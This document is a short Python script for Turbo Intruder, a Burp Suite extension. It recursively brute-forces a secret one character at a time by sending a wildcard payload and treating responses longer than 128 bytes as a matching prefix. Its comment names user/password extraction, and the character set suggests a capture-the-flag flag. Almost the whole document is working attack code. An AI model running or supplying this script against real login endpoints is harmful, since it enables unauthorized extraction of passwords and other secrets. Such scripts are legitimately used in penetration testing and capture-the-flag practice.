# Recursive code snippet for Turbo Intruder which uses a payload  using the following characters [a-Z,0-9,{_}]. E.g. User/password and a wildcard.

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    engine.userState['data'] = ""
    filtered = string.ascii_letters + string.digits + "{_}"
    for i in filtered:
        engine.queue(target.req, i)
        


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.length > 128:
        req.engine.userState['data'] = ''.join(req.words)
        req.label = req.engine.userState['data']
        table.add(req)
        filtered = string.ascii_letters + string.digits + "{_}"
        for i in filtered:
            req.engine.queue(req.template, req.engine.userState['data']+i)
